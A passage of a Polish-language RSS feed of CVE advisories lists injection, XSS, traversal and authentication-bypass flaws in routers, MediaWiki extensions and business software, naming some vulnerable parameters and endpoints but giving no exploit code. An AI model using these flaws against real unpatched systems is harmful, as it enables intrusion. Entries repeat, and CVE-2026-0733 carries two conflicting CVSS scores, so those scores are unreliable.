użytkownika.</description></item><item><title>CVE-2025-67279</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67279</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>Problem w TIM Solution GmbH TIM BPM Suite i TIM FLOW przed wersją 9.1.2 umożliwia zdalnemu atakującemu eskalację uprawnień za pośrednictwem aplikacji przechowującej skróty haseł w formacie MD5</description></item><item><title>CVE-2025-67278</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67278</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>Problem w TIM Solution GmbH TIM BPM Suite i TIM FLOW przed wersją 9.1.2 umożliwia zdalnemu atakującemu eskalację uprawnień za pomocą spreparowanego żądania HTTP</description></item><item><title>CVE-2025-67004</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67004</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>Luka w zabezpieczeniach CouchCMS 2.4 umożliwiająca ujawnienie informacji umożliwia administratorowi odczytywanie dowolnych plików poprzez przechodzenie po katalogach.Może ujawnić kod źródłowy lub inne poufne informacje, jeśli zostanie odpowiednio uzbrojony.</description></item><item><title>CVE-2025-70161</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-70161</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>EDIMAX BR-6208AC V2_1.02 jest podatny na wstrzykiwanie poleceń.Dzieje się tak, ponieważ pole pppUserName jest bezpośrednio przekazywane do polecenia powłoki za pośrednictwem funkcji system() bez odpowiedniego oczyszczenia.Osoba atakująca może to wykorzystać, wprowadzając złośliwe polecenia do pola pppUserName, umożliwiając wykonanie dowolnego kodu.</description></item><item><title>CVE-2025-69542</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69542</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>W usłudze demona DHCP D-Link DIR895LA1 v102b07 wykryto lukę w zabezpieczeniach związaną z wstrzykiwaniem poleceń.Luka występuje w logice przetwarzania odnowienia dzierżawy, w której parametr nazwy hosta DHCP jest bezpośrednio łączony z poleceniem systemowym bez odpowiedniego oczyszczenia.Gdy klient DHCP odnawia istniejącą dzierżawę przy użyciu złośliwej nazwy hosta, dowolne polecenia mogą być wykonywane z uprawnieniami roota.</description></item><item><title>CVE-2025-67133</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67133</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>Błąd w Hero Motocorp Vida V1 Pro 2.0.7 umożliwia lokalnemu atakującemu spowodowanie odmowy usługi za pośrednictwem komponentu BLE</description></item><item><title>CVE-2025-66744</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-66744</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>W Yonyou YonBIP v3 i wcześniejszych interfejs LoginWithV8 w systemie obsługi aplikacji danych szeregowych jest podatny na przemierzanie ścieżek, umożliwiając nieautoryzowany dostęp do wrażliwych informacji w systemie</description></item><item><title>CVE-2025-66715</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-66715</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>Luka w zabezpieczeniach Axtion ODISSAAS ODIS v1.8.4 umożliwiająca przejęcie biblioteki DLL umożliwia atakującym wykonanie dowolnego kodu za pośrednictwem spreparowanego pliku DLL.</description></item><item><title>CVE-2025-67810</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67810</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>W Area9 Rhapsode 1.47.3 uwierzytelniony atakujący może wykorzystać parametry operacji, adresu URL i nazwy pliku za pośrednictwem żądania POST w celu odczytania dowolnych plików z systemu plików serwera.Naprawiono w wersji 1.47.4 (#7254) i kolejnych wersjach.</description></item><item><title>CVE-2025-67811</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67811</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>Area9 Rhapsode 1.47.3 umożliwia wstrzykiwanie SQL za pośrednictwem wielu punktów końcowych API dostępnych dla uwierzytelnionych użytkowników.Niewystarczająca weryfikacja danych wejściowych umożliwia zdalnym atakującym wprowadzenie dowolnych poleceń SQL, co skutkuje nieautoryzowanym dostępem do bazy danych i potencjalnym naruszeniem poufnych danych.Naprawiono w wersji 1.47.4 i nowszych.</description></item><item><title>CVE-2025-60538</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-60538</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>Brak ograniczenia szybkości na stronie logowania shiori w wersji 1.7.4 i niższych pozwala atakującym ominąć uwierzytelnianie za pomocą ataku brute-force.</description></item><item><title>CVE-2025-51626</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-51626</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>Luka w zabezpieczeniach polegająca na wstrzykiwaniu SQL w pss.sale.com 1.0 poprzez parametr id do punktu końcowego userfiles/php/cancel_order.php.</description></item><item><title>CVE-2026-22714</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22714</link><pubDate>Thu, 08 Jan 2026 23:56:07 +0000</pubDate><description>Luka w zabezpieczeniach Niewłaściwa neutralizacja danych wejściowych podczas generowania strony internetowej (XSS lub „Cross-site Scripting”) w Wikimedia Foundation Mediawiki - Monaco Skin umożliwia Cross-Site Scripting (XSS). Ten problem dotyczy Mediawiki - Monaco Skin: 1.45, 1.44, 1.43, 1.39.</description></item><item><title>CVE-2026-0733</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-0733</link><pubDate>Thu, 08 Jan 2026 23:32:13 +0000</pubDate><description>W systemie rejestracji kursów online PHPGurukul do wersji 3.1 została stwierdzona luka.Ma to wpływ na nieznaną funkcję pliku /onlinecourse/admin/manage-students.php.Ta manipulacja argumentem cid powoduje wstrzyknięcie sql.Istnieje możliwość zdalnego zainicjowania ataku.Exploit został publicznie ujawniony i może zostać wykorzystany.
+CVSS Score: 4.3 (medium)</description></item><item><title>CVE-2026-22710</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22710</link><pubDate>Fri, 09 Jan 2026 00:30:28 +0000</pubDate><description>Luka w zabezpieczeniach Niewłaściwa neutralizacja danych wejściowych podczas generowania strony internetowej (XSS lub „Cross-site Scripting”) w Wikimedia Foundation Mediawiki - rozszerzenie Wikibase umożliwia obsługę skryptów krzyżowych (XSS). Ten problem dotyczy Mediawiki - rozszerzenie Wikibase: 1.45, 1.44, 1.43, 1.39.</description></item><item><title>CVE-2026-22712</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22712</link><pubDate>Fri, 09 Jan 2026 00:30:28 +0000</pubDate><description>Niewłaściwe kodowanie lub ucieczka danych wyjściowych z powodu zamiany magicznych słów w luce ParserAfterTidy w Wikimedia Foundation Mediawiki - rozszerzenie ApprovedRevs umożliwia manipulację danymi wejściowymi. Ten problem dotyczy rozszerzenia Mediawiki - ApprovedRevs: 1.45, 1.44, 1.43, 1.39.</description></item><item><title>CVE-2026-22714</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22714</link><pubDate>Fri, 09 Jan 2026 00:30:28 +0000</pubDate><description>Luka w zabezpieczeniach Niewłaściwa neutralizacja danych wejściowych podczas generowania strony internetowej (XSS lub „Cross-site Scripting”) w Wikimedia Foundation Mediawiki - Monaco Skin umożliwia Cross-Site Scripting (XSS). Ten problem dotyczy Mediawiki - Monaco Skin: 1.45, 1.44, 1.43, 1.39.</description></item><item><title>CVE-2026-22713</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22713</link><pubDate>Fri, 09 Jan 2026 00:30:28 +0000</pubDate><description>Luka w zabezpieczeniach Nieprawidłowa neutralizacja danych wejściowych podczas generowania strony internetowej (XSS lub „Cross-site Scripting”) w rozszerzeniu Wikimedia Foundation Mediawiki - GrowthExperiments umożliwia obsługę skryptów Cross-Site Scripting (XSS). Ten problem dotyczy rozszerzenia Mediawiki - GrowthExperiments: 1.45, 1.44, 1.43, 1.39.</description></item><item><title>CVE-2025-67282</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67282</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>W pakiecie TIM BPM Suite/TIM FLOW do wersji 9.1.2 istnieje wiele luk w zabezpieczeniach związanych z obejściem autoryzacji, które umożliwiają użytkownikowi o niskich uprawnieniach pobieranie skrótów haseł innego użytkownika, uzyskiwanie dostępu do elementów roboczych innego użytkownika, modyfikowanie ograniczonej zawartości w przepływach pracy, modyfikowanie logo aplikacji i manipulowanie profilem innego użytkownika.</description></item><item><title>CVE-2025-67281</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67281</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>W pakiecie TIM BPM Suite/TIM FLOW do wersji 9.1.2 istnieje wiele luk w zabezpieczeniach polegających na wstrzykiwaniu kodu SQL, które umożliwiają użytkownikowi o niskich uprawnieniach i uprawnieniach administratora dostęp do bazy danych i jej zawartości.</description></item><item><title>CVE-2025-67280</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67280</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>W pakiecie TIM BPM Suite/TIM FLOW do wersji 9.1.2 istnieje wiele luk w zabezpieczeniach związanych z wstrzykiwaniem języka Hibernate Query Language, które umożliwiają użytkownikowi o niskim poziomie uprawnień wyodrębnianie haseł innych użytkowników i uzyskiwanie dostępu do wrażliwych danych innego użytkownika.</description></item><item><title>CVE-2025-67279</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67279</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>Problem w TIM Solution GmbH TIM BPM Suite i TIM FLOW przed wersją 9.1.2 umożliwia zdalnemu atakującemu eskalację uprawnień za pośrednictwem aplikacji przechowującej skróty haseł w formacie MD5</description></item><item><title>CVE-2025-67278</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67278</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>Problem w TIM Solution GmbH TIM BPM Suite i TIM FLOW przed wersją 9.1.2 umożliwia zdalnemu atakującemu eskalację uprawnień za pomocą spreparowanego żądania HTTP</description></item><item><title>CVE-2025-67004</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67004</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>Luka w zabezpieczeniach CouchCMS 2.4 umożliwiająca ujawnienie informacji umożliwia administratorowi odczytywanie dowolnych plików poprzez przechodzenie po katalogach.Może ujawnić kod źródłowy lub inne poufne informacje, jeśli zostanie odpowiednio uzbrojony.</description></item><item><title>CVE-2025-70161</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-70161</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>EDIMAX BR-6208AC V2_1.02 jest podatny na wstrzykiwanie poleceń.Dzieje się tak, ponieważ pole pppUserName jest bezpośrednio przekazywane do polecenia powłoki za pośrednictwem funkcji system() bez odpowiedniego oczyszczenia.Osoba atakująca może to wykorzystać, wprowadzając złośliwe polecenia do pola pppUserName, umożliwiając wykonanie dowolnego kodu.</description></item><item><title>CVE-2025-69542</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-69542</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>W usłudze demona DHCP D-Link DIR895LA1 v102b07 wykryto lukę w zabezpieczeniach związaną z wstrzykiwaniem poleceń.Luka występuje w logice przetwarzania odnowienia dzierżawy, w której parametr nazwy hosta DHCP jest bezpośrednio łączony z poleceniem systemowym bez odpowiedniego oczyszczenia.Gdy klient DHCP odnawia istniejącą dzierżawę przy użyciu złośliwej nazwy hosta, dowolne polecenia mogą być wykonywane z uprawnieniami roota.</description></item><item><title>CVE-2025-67133</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67133</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>Błąd w Hero Motocorp Vida V1 Pro 2.0.7 umożliwia lokalnemu atakującemu spowodowanie odmowy usługi za pośrednictwem komponentu BLE</description></item><item><title>CVE-2025-66744</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-66744</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>W Yonyou YonBIP v3 i wcześniejszych interfejs LoginWithV8 w systemie obsługi aplikacji danych szeregowych jest podatny na przemierzanie ścieżek, umożliwiając nieautoryzowany dostęp do wrażliwych informacji w systemie</description></item><item><title>CVE-2025-66715</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-66715</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>Luka w zabezpieczeniach Axtion ODISSAAS ODIS v1.8.4 umożliwiająca przejęcie biblioteki DLL umożliwia atakującym wykonanie dowolnego kodu za pośrednictwem spreparowanego pliku DLL.</description></item><item><title>CVE-2025-67810</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67810</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>W Area9 Rhapsode 1.47.3 uwierzytelniony atakujący może wykorzystać parametry operacji, adresu URL i nazwy pliku za pośrednictwem żądania POST w celu odczytania dowolnych plików z systemu plików serwera.Naprawiono w wersji 1.47.4 (#7254) i kolejnych wersjach.</description></item><item><title>CVE-2025-67811</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67811</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>Area9 Rhapsode 1.47.3 umożliwia wstrzykiwanie SQL za pośrednictwem wielu punktów końcowych API dostępnych dla uwierzytelnionych użytkowników.Niewystarczająca weryfikacja danych wejściowych umożliwia zdalnym atakującym wprowadzenie dowolnych poleceń SQL, co skutkuje nieautoryzowanym dostępem do bazy danych i potencjalnym naruszeniem poufnych danych.Naprawiono w wersji 1.47.4 i nowszych.</description></item><item><title>CVE-2025-60538</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-60538</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>Brak ograniczenia szybkości na stronie logowania shiori w wersji 1.7.4 i niższych pozwala atakującym ominąć uwierzytelnianie za pomocą ataku brute-force.</description></item><item><title>CVE-2025-51626</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-51626</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>Luka w zabezpieczeniach polegająca na wstrzykiwaniu SQL w pss.sale.com 1.0 poprzez parametr id do punktu końcowego userfiles/php/cancel_order.php.</description></item><item><title>CVE-2025-67070</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67070</link><pubDate>Fri, 09 Jan 2026 00:00:00 +0000</pubDate><description>W Intelbras CFTV IP NVD 9032 R Ftd V2.800.00IB00C.0.T występuje luka w zabezpieczeniach, która umożliwia nieuwierzytelnionemu atakującemu ominięcie mechanizmu uwierzytelniania wieloskładnikowego (MFA) podczas procesu odzyskiwania hasła.Dzięki temu istnieje możliwość zmiany hasła administratora i uzyskania pełnego dostępu do panelu administracyjnego.</description></item><item><title>CVE-2026-22714</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22714</link><pubDate>Thu, 08 Jan 2026 23:56:07 +0000</pubDate><description>Luka w zabezpieczeniach Niewłaściwa neutralizacja danych wejściowych podczas generowania strony internetowej (XSS lub „Cross-site Scripting”) w Wikimedia Foundation Mediawiki - Monaco Skin umożliwia Cross-Site Scripting (XSS). Ten problem dotyczy Mediawiki - Monaco Skin: 1.45, 1.44, 1.43, 1.39.</description></item><item><title>CVE-2026-0733</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-0733</link><pubDate>Thu, 08 Jan 2026 23:32:13 +0000</pubDate><description>W systemie rejestracji kursów online PHPGurukul do wersji 3.1 została stwierdzona luka.Ma to wpływ na nieznaną funkcję pliku /onlinecourse/admin/manage-students.php.Ta manipulacja argumentem cid powoduje wstrzyknięcie sql.Istnieje możliwość zdalnego zainicjowania ataku.Exploit został publicznie ujawniony i może zostać wykorzystany.
 
 CVSS Score: 6.3 (medium)</description></item><item><title>CVE-2026-0732</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-0732</link><pubDate>Thu, 08 Jan 2026 23:32:08 +0000</pubDate><description>W D-Link DI-8200G 17.12.20A1 została odkryta podatność.Wpływa to na nieznaną funkcję pliku /upgrade_filter.asp.Manipulacja ścieżką argumentów powoduje wstrzyknięcie polecenia.Atak może zostać przeprowadzony zdalnie.Exploit został upubliczniony i może zostać wykorzystany.
 
